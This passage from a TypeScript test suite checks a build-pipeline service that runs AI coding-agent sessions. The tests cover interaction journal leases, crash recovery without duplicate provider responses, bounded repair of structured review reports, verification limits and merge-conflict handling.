        interactions: NonNullable<BuildPipelineProvider["interactions"]>;
      }).interactions = {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests: [request],
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          resolveCalls += 1;
          return { result: "applied", sessionId, interactionId, revision: 2 };
        },
      };

      await service.advanceNow(started.id);

      expect(resolveCalls).toBe(0);
      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "failed",
        error: expect.stringContaining("could not be resolved safely"),
        failureContext: {
          phase: "building",
          kind: "interactive-request",
          sessionId: session.sdkSessionId,
          requestId: request.id,
        },
      });
    });
  });

  test("leases a durable interaction response to only one backend process", async () => {
    await withService(async (service, storage, provider) => {
      const started = await service.start(startInput());
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);
      const record = await storage.getBuildPipeline(started.id);
      if (!record) throw new Error("Pipeline disappeared");
      const running = record.snapshot as BuildPipeline;
      const session = running.sessions[running.currentSessionIndex]!;
      const request = pendingQuestion(session.sdkSessionId, "contended-question");
      const claimedAt = Date.now();
      running.pendingInteractionResolution = {
        journalId: "contended-journal",
        sessionKey: session.sessionKey,
        sessionId: session.sdkSessionId,
        interactionId: request.id,
        provider: "claude",
        kind: "question",
        phase: "build",
        requestedAt: request.createdAt,
        claimedAt,
        action: "decline-and-continue",
        title: request.presentation.title,
        questions: [],
      };
      await storage.updateAgentInteractionResolutionJournal(() => ({
        version: AGENT_INTERACTION_JOURNAL_VERSION,
        entries: [{
          id: "contended-journal",
          interactionId: request.id,
          provider: "claude",
          kind: "question",
          sessionId: session.sdkSessionId,
          state: "claimed",
          claim: {
            workflowType: "build-pipeline",
            workflowId: running.id,
            phase: "building",
            fence: session.sessionKey,
            claimedAt,
          },
        }],
      }));
      await storage.saveBuildPipeline(
        running.id,
        running.projectId,
        running.environmentId,
        record.version,
        running,
        record.revision,
      );

      let requests = [request];
      let resolveCalls = 0;
      (provider as unknown as BuildPipelineProvider & {
        interactions: NonNullable<BuildPipelineProvider["interactions"]>;
      }).interactions = {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: resolveCalls,
            requests,
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          resolveCalls += 1;
          requests = [];
          await Bun.sleep(2);
          return { result: "applied", sessionId, interactionId, revision: 2 };
        },
      };
      const second = new BuildPipelineService(
        storage,
        async <T>(): Promise<T> => {
          throw new Error("No backend command is expected");
        },
        { autoAdvance: false, provider: async () => provider },
      );
      try {
        await Promise.all([
          service.advanceNow(started.id),
          second.advanceNow(started.id),
        ]);
        const resolved = await pipeline(storage, started.id);
        expect(resolveCalls).toBe(1);
        expect(resolved.phase).toBe("building");
        expect(resolved.autoDeclineCount).toBe(1);
        expect(resolved.sessions[resolved.currentSessionIndex]?.interactionTranscript)
          .toHaveLength(1);
      } finally {
        await second.shutdown();
      }
    });
  });

  test("recovers each interaction journal crash boundary without a duplicate provider response", async () => {
    await withService(async (service, storage, provider) => {
      const started = await service.start(startInput());
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);
      const running = await pipeline(storage, started.id);
      const session = running.sessions[running.currentSessionIndex]!;
      const claimedAt = Date.now();
      let requests: AgentInteractionRequest[] = [{
        version: AGENT_INTERACTION_CONTRACT_VERSION,
        id: "claimed-question",
        provider: "claude",
        kind: "question",
        origin: "build-pipeline",
        sessionId: session.sdkSessionId,
        state: "pending",
        revision: 1,
        presentation: {
          title: "Question found after restart",
          questions: [],
        },
        createdAt: claimedAt,
        updatedAt: claimedAt,
      }];
      const responses: string[] = [];
      (provider as unknown as BuildPipelineProvider & {
        interactions: NonNullable<BuildPipelineProvider["interactions"]>;
      }).interactions = {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests,
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          responses.push(interactionId);
          requests = requests.filter((request) => request.id !== interactionId);
          return { result: "applied", sessionId, interactionId, revision: 2 };
        },
      };

      await storage.updateAgentInteractionResolutionJournal(() => ({
        version: AGENT_INTERACTION_JOURNAL_VERSION,
        entries: [{
          id: "journal-claimed",
          interactionId: "claimed-question",
          provider: "claude",
          kind: "question",
          sessionId: session.sdkSessionId,
          state: "claimed",
          claim: {
            workflowType: "build-pipeline",
            workflowId: started.id,
            phase: "building",
            fence: session.sessionKey,
            claimedAt,
          },
        }],
      }));
      await service.advanceNow(started.id);
      expect(responses).toEqual(["claimed-question"]);
      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "building",
        autoDeclineCount: 1,
      });

      // Provider-resolved input recovery writes the workflow record without
      // sending anything upstream a second time.
      const inputResolvedAt = Date.now();
      await storage.updateAgentInteractionResolutionJournal((journal) => ({
        ...journal,
        entries: [...journal.entries, {
          id: "journal-provider-resolved-input",
          interactionId: "resolved-question",
          provider: "claude",
          kind: "question",
          sessionId: session.sdkSessionId,
          state: "provider-resolved",
          claim: {
            workflowType: "build-pipeline",
            workflowId: started.id,
            phase: "building",
            fence: session.sessionKey,
            claimedAt: inputResolvedAt - 1,
          },
          outcome: "auto-declined",
          providerResolvedAt: inputResolvedAt,
        }],
      }));
      await service.advanceNow(started.id);
      expect(responses).toEqual(["claimed-question"]);
      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "building",
        autoDeclineCount: 2,
      });

      // The same boundary for authorization records a terminal failure, again
      // without redispatching an already accepted provider response.
      const authorizationResolvedAt = Date.now();
      await storage.updateAgentInteractionResolutionJournal((journal) => ({
        ...journal,
        entries: [...journal.entries, {
          id: "journal-provider-resolved-auth",
          interactionId: "resolved-permission",
          provider: "claude",
          kind: "permission",
          sessionId: session.sdkSessionId,
          state: "provider-resolved",
          claim: {
            workflowType: "build-pipeline",
            workflowId: started.id,
            phase: "building",
            fence: session.sessionKey,
            claimedAt: authorizationResolvedAt - 1,
          },
          outcome: "denied",
          providerResolvedAt: authorizationResolvedAt,
        }],
      }));
      await service.advanceNow(started.id);
      expect(responses).toEqual(["claimed-question"]);
      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "failed",
        failureContext: {
          kind: "interactive-request",
          requestId: "resolved-permission",
        },
      });

      // Simulate the last crash window: workflow state is durable, while the
      // journal update that follows it was lost. init() must finish only that
      // journal transition and must not contact the provider.
      await storage.updateAgentInteractionResolutionJournal((journal) => ({
        ...journal,
        entries: journal.entries.map((entry) =>
          entry.id === "journal-provider-resolved-auth"
            ? {
                ...entry,
                state: "provider-resolved" as const,
                workflowRecordedAt: undefined,
              }
            : entry),
      }));
      const restored = new BuildPipelineService(
        storage,
        async <T>(): Promise<T> => {
          throw new Error("Crash-boundary journal recovery must stay local");
        },
        { autoAdvance: false, provider: async () => provider },
      );
      try {
        await restored.init();
        const journal = await storage.getAgentInteractionResolutionJournal();
        expect(journal.entries.find((entry) =>
          entry.id === "journal-provider-resolved-auth"
        )).toMatchObject({
          state: "workflow-recorded",
          outcome: "denied",
        });
        expect(responses).toEqual(["claimed-question"]);
      } finally {
        await restored.shutdown();
      }
    });
  });

  test("re-registers restored sessions with cached and injected providers", async () => {
    await withService(async (service, storage, provider) => {
      const started = await service.start(startInput());
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);
      const restored = await pipeline(storage, started.id);
      const resolveProvider = service as unknown as {
        provider: (
          pipeline: BuildPipeline,
          agent: "claude",
        ) => Promise<BuildPipelineProvider>;
        providers: Map<string, BuildPipelineProvider>;
        options: {
          provider?: () => Promise<BuildPipelineProvider>;
        };
      };

      provider.registered.length = 0;
      expect(await resolveProvider.provider(restored, "claude")).toBe(provider);
      expect(provider.registered).toEqual([expect.objectContaining({
        sessionId: "build-1",
        interaction: expect.objectContaining({
          origin: "build-pipeline",
          interactionPolicy: UNATTENDED_AGENT_INTERACTION_POLICY,
          phase: "build",
          workflowId: started.id,
          provider: "claude",
          fence: expect.any(String),
        }),
      })]);

      const injected = new FakeProvider();
      resolveProvider.providers.clear();
      resolveProvider.options.provider = async () => injected;
      expect(await resolveProvider.provider(restored, "claude")).toBe(injected);
      expect(injected.registered).toEqual([expect.objectContaining({
        sessionId: "build-1",
        interaction: expect.objectContaining({
          origin: "build-pipeline",
          interactionPolicy: UNATTENDED_AGENT_INTERACTION_POLICY,
          phase: "build",
          workflowId: started.id,
          provider: "claude",
          fence: expect.any(String),
        }),
      })]);
    });
  });

  test("registers restored interaction metadata on a production bridge provider", async () => {
    await withService(async (service, storage) => {
      const started = await service.start(startInput());
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);
      const restored = await pipeline(storage, started.id);
      const production = new BuildPipelineService(
        storage,
        async <T>(command: string): Promise<T> => {
          if (command === "start_local_claude_server_cmd") {
            return { port: 43210, authToken: "test-token" } as T;
          }
          throw new Error(`Unexpected command: ${command}`);
        },
        { autoAdvance: false },
      );
      try {
        const provider = await (production as unknown as {
          provider: (
            pipeline: BuildPipeline,
            agent: "claude",
          ) => Promise<BuildPipelineProvider>;
        }).provider(restored, "claude");
        const registration = (provider as unknown as {
          interactionTracker: {
            registration: (sessionId: string) => ProviderSessionRegistration;
          };
        }).interactionTracker.registration("build-1");
        expect(registration).toEqual(expect.objectContaining({
          origin: "build-pipeline",
          interactionPolicy: UNATTENDED_AGENT_INTERACTION_POLICY,
          phase: "build",
          workflowId: started.id,
          provider: "claude",
          fence: expect.any(String),
        }));
      } finally {
        await production.shutdown();
      }
    });
  });

  test("repairs a report that broke the contract without restarting the review", async () => {
    await withService(async (service, storage, provider) => {
      let reports = 0;
      provider.structured = async <T>(
        sessionId: string,
        requestId: string,
      ): Promise<StructuredOutputResult<T>> => {
        if (provider.phases.get(sessionId) !== "review") {
          return {
            ok: true,
            provider: "claude",
            requestId,
            value: { complete: true, rationale: "All criteria pass." } as T,
          };
        }
        reports += 1;
        return {
          ok: true,
          provider: "claude",
          requestId,
          // Schema-valid but contract-invalid: the failure count disagrees with
          // the failure details, which no JSON schema can express.
          value: (reports === 1
            ? {
              ...cleanReview,
              testResults: {
                total: 2,
                passed: 1,
                failed: 1,
                notRun: 0,
                failures: [],
              },
            }
            : cleanReview) as T,
        };
      };
      const started = await service.start(startInput());
      for (
        let pass = 0;
        pass < 8 && (await pipeline(storage, started.id)).phase !== "verifying";
        pass += 1
      ) {
        await service.advanceNow(started.id);
      }

      const advanced = await pipeline(storage, started.id);
      expect(advanced.phase).toBe("verifying");
      expect(advanced.structuredReview).toEqual(cleanReview);
      // The repair is a second turn in the first review session, not a new one.
      const reviews = advanced.sessions.filter((session) => session.phase === "review");
      expect(reviews).toHaveLength(1);
      expect(reviews[0]).toMatchObject({
        structuredReportRepairAttempts: 1,
        structuredResultStatus: "accepted",
      });
      const repair = provider.sent.find((sent) =>
        sent.prompt.includes("Failure details count must equal failed."));
      expect(repair).toMatchObject({
        sessionId: reviews[0]!.sdkSessionId,
        requestId: reviews[0]!.structuredRequestId,
        schema: STRUCTURED_REVIEW_REPORT_JSON_SCHEMA,
      });
      expect(repair!.prompt).toContain("$.testResults.failures");
      expect(repair!.prompt).toContain("repair attempt 1 of 3");
    });
  });

  test("accepts a report repaired on the last permitted attempt", async () => {
    await withService(async (service, storage, provider) => {
      let reports = 0;
      provider.structured = async <T>(
        sessionId: string,
        requestId: string,
      ): Promise<StructuredOutputResult<T>> => {
        if (provider.phases.get(sessionId) !== "review") {
          return {
            ok: true,
            provider: "claude",
            requestId,
            value: { complete: true, rationale: "All criteria pass." } as T,
          };
        }
        reports += 1;
        // Rejected three times, corrected on the third and final repair — the
        // path where the attempt counter is read back from a persisted value
        // rather than from an absent one.
        return {
          ok: true,
          provider: "claude",
          requestId,
          value: (reports <= 3
            ? { ...cleanReview, riskProfile: { ...cleanReview.riskProfile, overallRisk: "severe" } }
            : cleanReview) as T,
        };
      };
      const started = await service.start(startInput());
      for (
        let pass = 0;
        pass < 12 && (await pipeline(storage, started.id)).phase !== "verifying";
        pass += 1
      ) {
        await service.advanceNow(started.id);
      }

      const advanced = await pipeline(storage, started.id);
      expect(advanced.phase).toBe("verifying");
      expect(advanced.structuredReview).toEqual(cleanReview);
      expect(reports).toBe(4);
      const reviews = advanced.sessions.filter((session) => session.phase === "review");
      expect(reviews).toHaveLength(1);
      expect(reviews[0]).toMatchObject({
        structuredReportRepairAttempts: 3,
        structuredResultStatus: "accepted",
      });
      // Each repair is its own turn under its own request id, and the last one
      // is the id the accepted report was read from.
      const repairs = provider.sent.filter((sent) =>
        sent.prompt.includes("$.riskProfile.overallRisk"));
      expect(repairs).toHaveLength(3);
      expect(new Set(repairs.map((sent) => sent.requestId)).size).toBe(3);
      expect(repairs.at(-1)?.requestId).toBe(reviews[0]!.structuredRequestId);
      expect(repairs.map((sent) => sent.sessionId)).toEqual(
        Array.from({ length: 3 }, () => reviews[0]!.sdkSessionId),
      );
      expect(repairs.map((sent) =>
        sent.prompt.includes(`repair attempt ${repairs.indexOf(sent) + 1} of 3`)
      )).toEqual([true, true, true]);
    });
  });

  test("fails the review once the bounded report repairs are exhausted", async () => {
    await withService(async (service, storage, provider) => {
      let reports = 0;
      provider.structured = async <T>(
        _sessionId: string,
        requestId: string,
      ): Promise<StructuredOutputResult<T>> => {
        reports += 1;
        return {
          ok: true,
          provider: "claude",
          requestId,
          value: { issues: "not-an-array" } as T,
        };
      };
      const started = await service.start(startInput());
      for (
        let pass = 0;
        pass < 12 && (await pipeline(storage, started.id)).phase !== "failed";
        pass += 1
      ) {
        await service.advanceNow(started.id);
      }

      const failed = await pipeline(storage, started.id);
      expect(failed).toMatchObject({
        phase: "failed",
        error: expect.stringContaining("3 repair attempts"),
      });
      // One original report plus exactly three repairs, all in one session.
      expect(reports).toBe(4);
      const reviews = failed.sessions.filter((session) => session.phase === "review");
      expect(reviews).toHaveLength(1);
      expect(reviews[0]?.structuredReportRepairAttempts).toBe(3);
    });
  });

  test("fails the review when a repair turn itself fails provider-side", async () => {
    await withService(async (service, storage, provider) => {
      let reports = 0;
      provider.structured = async <T>(
        _sessionId: string,
        requestId: string,
      ): Promise<StructuredOutputResult<T>> => {
        reports += 1;
        if (reports === 1) {
          // Schema-valid but contract-invalid: the failure count disagrees with
          // the failure details, so the report is rejected and a repair is asked
          // for. The provider error comes on the repair turn itself.
          return {
            ok: true,
            provider: "claude",
            requestId,
            value: {
              ...cleanReview,
              testResults: {
                total: 2,
                passed: 1,
                failed: 1,
                notRun: 0,
                failures: [],
              },
            } as T,
          };
        }
        return {
          ok: false,
          provider: "claude",
          requestId,
          error: {
            code: "provider_error",
            message: "the review provider did not produce a structured result",
            provider: "claude",
            retryable: true,
          },
        };
      };
      const started = await service.start(startInput());
      for (
        let pass = 0;
        pass < 8 && (await pipeline(storage, started.id)).phase !== "failed";
        pass += 1
      ) {
        await service.advanceNow(started.id);
      }

      const failed = await pipeline(storage, started.id);
      expect(failed).toMatchObject({
        phase: "failed",
        error: expect.stringContaining("did not produce a structured result"),
      });
      // One original report plus one repair turn; the provider error on the
      // repair is not repaired again, because no report was ever emitted for it.
      expect(reports).toBe(2);
      const reviews = failed.sessions.filter((session) => session.phase === "review");
      expect(reviews).toHaveLength(1);
      expect(reviews[0]?.structuredReportRepairAttempts).toBe(1);
      // The single repair was dispatched and still carried the report schema.
      const repairs = provider.sent.filter((sent) =>
        sent.prompt.includes("repair attempt 1 of 3"));
      expect(repairs).toHaveLength(1);
      expect(repairs[0]?.schema).toBe(STRUCTURED_REVIEW_REPORT_JSON_SCHEMA);
    });
  });

  for (const [label, legacyMessage, expectedRequestId] of [
    [
      "nested provider metadata",
      { info: { role: "user", id: "legacy-info-request" } },
      "legacy-info-request",
    ],
    [
      "an explicit requestId",
      { requestId: "legacy-explicit-request" },
      "legacy-explicit-request",
    ],
    [
      "a top-level user message",
      { id: "legacy-user-request", role: "user" },
      "legacy-user-request",
    ],
  ] as const) {
    test(`recovers a legacy verification request id from ${label}`, async () => {
      await withService(async (service, storage, provider) => {
        const verifying = await startVerifying(service, storage);
        const record = await storage.getBuildPipeline(verifying.id);
        if (!record) throw new Error("Pipeline disappeared");
        const snapshot = record.snapshot as BuildPipeline;
        const session = snapshot.sessions[snapshot.currentSessionIndex]!;
        delete session.structuredRequestId;
        await storage.saveBuildPipeline(
          snapshot.id,
          snapshot.projectId,
          snapshot.environmentId,
          record.version,
          snapshot,
          record.revision,
        );

        provider.messages = async (sessionId) =>
          provider.phases.get(sessionId) === "verify"
            ? [legacyMessage]
            : [];
        let observedRequestId = "";
        provider.structured = async <T>(
          sessionId: string,
          requestId: string,
        ): Promise<StructuredOutputResult<T>> => {
          observedRequestId = requestId;
          return {
            ok: true,
            provider: "claude",
            requestId,
            value: (provider.phases.get(sessionId) === "review"
              ? cleanReview
              : { complete: true, rationale: "Recovered." }) as T,
          };
        };

        await service.advanceNow(verifying.id);

        expect(observedRequestId).toBe(expectedRequestId);
        expect((await pipeline(storage, verifying.id)).phase).toBe("creating-pr");
      });
    });
  }

  test("fails a legacy verification snapshot with no recoverable request id", async () => {
    await withService(async (service, storage, provider) => {
      const verifying = await startVerifying(service, storage);
      const record = await storage.getBuildPipeline(verifying.id);
      if (!record) throw new Error("Pipeline disappeared");
      const snapshot = record.snapshot as BuildPipeline;
      delete snapshot.sessions[snapshot.currentSessionIndex]!.structuredRequestId;
      await storage.saveBuildPipeline(
        snapshot.id,
        snapshot.projectId,
        snapshot.environmentId,
        record.version,
        snapshot,
        record.revision,
      );
      provider.messages = async () => [
        null,
        "not-an-object",
        { info: { role: "assistant", id: "not-a-user" } },
      ];

      await service.advanceNow(verifying.id);

      expect(await pipeline(storage, verifying.id)).toMatchObject({
        phase: "failed",
        error: "Verification result key is missing",
      });
    });
  });

  test("loops through fix work and stops at the verification iteration bound", async () => {
    await withService(async (service, storage, provider) => {
      provider.structured = async <T>(
        sessionId: string,
        requestId: string,
      ): Promise<StructuredOutputResult<T>> => ({
        ok: true,
        provider: "claude",
        requestId,
        value: (provider.phases.get(sessionId) === "review"
          ? cleanReview
          : { complete: false, rationale: "Still failing acceptance checks." }) as T,
      });
      const started = await service.start(startInput({ maxIterations: 1 }));
      for (let pass = 0; pass < 8; pass += 1) {
        await service.advanceNow(started.id);
      }
      const failed = await pipeline(storage, started.id);
      expect(failed).toMatchObject({
        phase: "failed",
        iteration: 1,
        verificationResult: "fail",
        error: expect.stringContaining("failed after 1 iterations"),
      });
      expect(failed.sessions.map((session) => session.phase)).toEqual([
        "build",
        "review",
        "verify",
        "fix",
        "review",
        "verify",
      ]);
    });
  });

  test("persists a conflicting PR and completes only after resolution is verified", async () => {
    await withService(async (service, storage, _provider, _invocations, controls) => {
      controls.detection = {
        url: "https://github.com/acme/repo/pull/9",
        state: "open",
        hasMergeConflicts: true,
      };
      const started = await service.start(startInput());
      for (let pass = 0; pass < 6; pass += 1) {
        await service.advanceNow(started.id);
      }
      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "resolving-conflicts",
      });
      controls.detection = {
        ...controls.detection,
        hasMergeConflicts: null,
      };
      await service.advanceNow(started.id);
      expect((await pipeline(storage, started.id)).phase).toBe("resolving-conflicts");
      expect(await storage.getEnvironment("env-1")).toMatchObject({
        prUrl: "https://github.com/acme/repo/pull/9",
        hasMergeConflicts: null,
      });
      controls.detection = {
        ...controls.detection,
        hasMergeConflicts: false,
      };
      await service.advanceNow(started.id);
      expect((await pipeline(storage, started.id)).phase).toBe("complete");
      expect(await storage.getEnvironment("env-1")).toMatchObject({
        prUrl: "https://github.com/acme/repo/pull/9",
        hasMergeConflicts: false,
      });
    });
  });

  test("init retries a terminal comment left in posting state after a crash", async () => {
    await withService(async (service, storage, _provider, invocations, controls) => {
      controls.failCommands.add("post_linear_completion_comment");
      const started = await service.start(startInput({
        source: {
          type: "linear",
          issueId: "issue-1",
          issueIdentifier: "ENG-1",
        },
      }));
      for (let pass = 0; pass < 6; pass += 1) {
        await service.advanceNow(started.id);
      }
      const record = await storage.getBuildPipeline(started.id);
      if (!record) throw new Error("Pipeline disappeared");
      const snapshot = record.snapshot as BuildPipeline;
      snapshot.completionCommentStatus = "posting";
      delete snapshot.completionCommentError;
      await storage.saveBuildPipeline(
        snapshot.id,
        snapshot.projectId,
        snapshot.environmentId,
        2,
        snapshot,
        record.revision,
      );
      controls.failCommands.delete("post_linear_completion_comment");
      await service.init();
      expect(await pipeline(storage, started.id)).toMatchObject({
        completionCommentStatus: "posted",
        completionCommentId: "comment-1",
      });
      expect(invocations.filter((entry) =>
        entry.command === "post_linear_completion_comment")).toHaveLength(2);
    });
  });

  test("parks behind a live processing lease and takes over once it expires", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session } = await startBuilding(service, storage);
      const request = pendingQuestion(session.sdkSessionId, "leased-question");
      const claimedAt = Date.now() - 10 * 60_000;
      await mutateStored(storage, started.id, (snapshot) => {
        snapshot.pendingInteractionResolution = pendingEnvelope(
          session,
          request,
          "leased-journal",
          claimedAt,
        );
      });
      const seedForeignLease = async (expiresAt: number): Promise<void> => {
        await storage.updateAgentInteractionResolutionJournal(() => ({
          version: AGENT_INTERACTION_JOURNAL_VERSION,
          entries: [{
            id: "leased-journal",
            interactionId: request.id,
            provider: "claude",
            kind: "question",
            sessionId: session.sdkSessionId,
            state: "claimed",
            claim: {
              workflowType: "build-pipeline",
              workflowId: started.id,
              phase: "building",
              fence: session.sessionKey,
              claimedAt,
            },
            processing: {
              ownerId: "another-backend-process",
              token: "another-backend-token",
              acquiredAt: claimedAt,
              expiresAt,
            },
          }],
        }));
      };
      let resolveCalls = 0;
      installInteractions(provider, {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests: [request],
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          resolveCalls += 1;
          return { result: "applied", sessionId, interactionId, revision: 2 };
        },
      });

      await seedForeignLease(Date.now() + 60_000);
      await service.advanceNow(started.id);
      // A live lease elsewhere is the whole point of the fence: park the durable
      // request rather than racing a response the other process may already have
      // sent.
      expect(resolveCalls).toBe(0);
      const parked = await pipeline(storage, started.id);
      expect(parked.phase).toBe("building");
      expect(parked.pendingInteractionResolution?.journalId).toBe("leased-journal");
      expect(parked.autoDeclineCount).toBeUndefined();

      await seedForeignLease(Date.now() - 5 * 60_000);
      await service.advanceNow(started.id);

      expect(resolveCalls).toBe(1);
      const resolved = await pipeline(storage, started.id);
      expect(resolved).toMatchObject({ phase: "building", autoDeclineCount: 1 });
      expect(resolved.pendingInteractionResolution).toBeUndefined();
      expect((await storage.getAgentInteractionResolutionJournal()).entries)
        .toContainEqual(expect.objectContaining({
          id: "leased-journal",
          state: "workflow-recorded",
          outcome: "auto-declined",
        }));
    });
  });

  test("reuses its own unexpired processing lease across a retried response", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session } = await startBuilding(service, storage);
      const request = pendingQuestion(session.sdkSessionId, "retried-question");
      const claimedAt = Date.now();
      await storage.updateAgentInteractionResolutionJournal(() => ({
        version: AGENT_INTERACTION_JOURNAL_VERSION,
        entries: [{
          id: "retried-journal",
          interactionId: request.id,
          provider: "claude",
          kind: "question",
          sessionId: session.sdkSessionId,
          state: "claimed",
          claim: {
            workflowType: "build-pipeline",
            workflowId: started.id,
            phase: "building",
            fence: session.sessionKey,
            claimedAt,
          },
        }],
      }));
      await mutateStored(storage, started.id, (snapshot) => {
        snapshot.pendingInteractionResolution = pendingEnvelope(
          session,
          request,
          "retried-journal",
          claimedAt,
        );
      });
      let attempts = 0;
      installInteractions(provider, {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests: [request],
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          attempts += 1;
          if (attempts <= 2) {
            throw new ProviderUnavailableError("claude bridge is unreachable");
          }
          return { result: "applied", sessionId, interactionId, revision: 2 };
        },
      });
      const lease = async (): Promise<unknown> =>
        (await storage.getAgentInteractionResolutionJournal())
          .entries.find((entry) => entry.id === "retried-journal")?.processing;

      await service.advanceNow(started.id);
      const first = await lease();
      expect(first).toMatchObject({
        acquiredAt: expect.any(Number),
        token: expect.any(String),
      });

      await service.advanceNow(started.id);
      // Minting a second token would leave the first response able to write
      // through a fence this process no longer believes it owns.
      expect(await lease()).toEqual(first);

      await service.advanceNow(started.id);
      expect(attempts).toBe(3);
      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "building",
        autoDeclineCount: 1,
      });
    });
  });

  test("refuses to record an interaction outcome through a stolen fence", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session } = await startBuilding(service, storage);
      const request = pendingQuestion(session.sdkSessionId, "stolen-fence-question");
      const claimedAt = Date.now();
      await storage.updateAgentInteractionResolutionJournal(() => ({
        version: AGENT_INTERACTION_JOURNAL_VERSION,
        entries: [{
          id: "stolen-fence-journal",
          interactionId: request.id,
          provider: "claude",
          kind: "question",
          sessionId: session.sdkSessionId,
          state: "claimed",
          claim: {
            workflowType: "build-pipeline",
            workflowId: started.id,
            phase: "building",
            fence: session.sessionKey,
            claimedAt,
          },
        }],
      }));
      await mutateStored(storage, started.id, (snapshot) => {
        snapshot.pendingInteractionResolution = pendingEnvelope(
          session,
          request,
          "stolen-fence-journal",
          claimedAt,
        );
      });
      let resolveCalls = 0;
      installInteractions(provider, {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests: [request],
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          resolveCalls += 1;
          // Another backend took the lease while this response was in flight,
          // so it now owns both the reconciliation and the record that follows.
          await storage.updateAgentInteractionResolutionJournal((journal) => ({
            ...journal,
            entries: journal.entries.map((entry) =>
              entry.id === "stolen-fence-journal"
                ? {
                    ...entry,
                    processing: {
                      ownerId: "another-backend-process",
                      token: "another-backend-token",
                      acquiredAt: claimedAt,
                      expiresAt: claimedAt + 120_000,
                    },
                  }
                : entry),
          }));
          return { result: "applied", sessionId, interactionId, revision: 2 };
        },
      });

      await service.advanceNow(started.id);

      expect(resolveCalls).toBe(1);
      const parked = await pipeline(storage, started.id);
      expect(parked.phase).toBe("building");
      expect(parked.autoDeclineCount).toBeUndefined();
      expect(parked.pendingInteractionResolution?.journalId)
        .toBe("stolen-fence-journal");
      expect(parked.sessions[parked.currentSessionIndex]?.interactionTranscript)
        .toBeUndefined();
      expect((await storage.getAgentInteractionResolutionJournal()).entries)
        .toContainEqual(expect.objectContaining({
          id: "stolen-fence-journal",
          state: "claimed",
        }));
    });
  });

  test("anchors a processing lease to a claim stamped by a clock running ahead", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session } = await startBuilding(service, storage);
      const request = pendingQuestion(session.sdkSessionId, "future-claim-question");
      const claimedAt = Date.now() + 5 * 60_000;
      await storage.updateAgentInteractionResolutionJournal(() => ({
        version: AGENT_INTERACTION_JOURNAL_VERSION,
        entries: [{
          id: "future-claim-journal",
          interactionId: request.id,
          provider: "claude",
          kind: "question",
          sessionId: session.sdkSessionId,
          state: "claimed",
          claim: {
            workflowType: "build-pipeline",
            workflowId: started.id,
            phase: "building",
            fence: session.sessionKey,
            claimedAt,
          },
        }],
      }));
      await mutateStored(storage, started.id, (snapshot) => {
        snapshot.pendingInteractionResolution = pendingEnvelope(
          session,
          request,
          "future-claim-journal",
          claimedAt,
        );
      });
      installInteractions(provider, {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests: [request],
          };
        },
        async resolveInteraction() {
          // Ends the pass with the lease still on the entry so it can be read.
          throw new ProviderUnavailableError("claude bridge is unreachable");
        },
      });

      await service.advanceNow(started.id);

      const entry = (await storage.getAgentInteractionResolutionJournal())
        .entries.find((candidate) => candidate.id === "future-claim-journal");
      // The lease validator requires `acquiredAt >= claimedAt`; rejecting the
      // whole journal update instead would strand the claim permanently.
      expect(entry?.processing?.acquiredAt).toBe(claimedAt);
      expect(entry?.processing?.expiresAt).toBeGreaterThan(claimedAt);
      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "building",
        error: expect.stringContaining("Reconnecting to claude"),
      });
    });
  });

  test("gives up after eight conflicting attempts to persist an outcome", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session } = await startBuilding(service, storage);
      const request = pendingQuestion(session.sdkSessionId, "contended-outcome-question");
      let requests = [request];
      installInteractions(provider, {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests,
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          requests = [];
          return { result: "applied", sessionId, interactionId, revision: 2 };
        },
      });
      const originalSave = storage.saveBuildPipeline.bind(storage);
      let outcomeSaveAttempts = 0;
      storage.saveBuildPipeline = async (...args) => {
        const candidate = args[4] as BuildPipeline;
        const isOutcomeSave = candidate.pendingInteractionResolution === undefined
          && candidate.sessions.some((entry) =>
            entry.interactionTranscript?.some((item) => item.id === request.id));
        if (isOutcomeSave) {
          // Every merge attempt loses to a concurrent writer. The retry budget
          // is what stops this from spinning for the life of the process.
          outcomeSaveAttempts += 1;
          throw new Error("Build pipeline revision conflict");
        }
        return originalSave(...args);
      };
      try {
        await service.advanceNow(started.id);

        expect(outcomeSaveAttempts).toBe(8);
        const parked = await pipeline(storage, started.id);
        expect(parked.phase).toBe("building");
        expect(parked.error)
          .toContain("could not be persisted after concurrent updates");
        expect(parked.pendingInteractionResolution?.interactionId).toBe(request.id);
      } finally {
        storage.saveBuildPipeline = originalSave;
      }
    });
  });

  test("refuses to merge an interaction outcome into a newer generation", async () => {
    await withService(async (service, storage, provider, _invocations, controls) => {
      const { started, session } = await startBuilding(service, storage);
      const request = pendingQuestion(session.sdkSessionId, "generation-mismatch-question");
      let requests = [request];
